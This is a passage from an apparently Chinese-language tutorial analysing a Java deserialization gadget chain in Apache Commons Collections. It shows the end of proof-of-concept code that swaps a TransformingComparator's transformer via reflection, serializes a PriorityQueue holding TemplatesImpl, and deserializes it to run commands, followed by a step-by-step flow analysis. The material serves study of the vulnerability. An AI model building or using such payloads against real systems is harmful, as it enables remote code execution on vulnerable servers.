;&#125;,new Object[]&#123;&#125;);        TransformingComparator transformingComparator=new TransformingComparator(new ConstantTransformer(1));        PriorityQueue priorityQueue=new PriorityQueue(transformingComparator);        priorityQueue.add(templates);        priorityQueue.add(2);        Class tc=transformingComparator.getClass();        Field comparator = tc.getDeclaredField(&quot;transformer&quot;);        comparator.setAccessible(true);         comparator.set(transformingComparator,invokerTransformer);        serialize(priorityQueue);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws Exception &#123;        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String filename) throws Exception &#123;        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));        Object obj=ois.readObject();        return obj;    &#125;&#125;
流程分析：也就是CC4后半条链直接调用了invokertransformer，并且我们需要手动把templates放进add方法：都是传入了一个泛型E e，然后进入了siftUp方法，这个e实际就是传入的templates：最后调用comparator.compare(x, (E) e)，在这里comparator已经是TransformingComparator：transformer就是invokertransformer，然后obj就是上面compare里传入的templates，也就触发了invokertransformer.transform(templates)，命令执行分析完毕
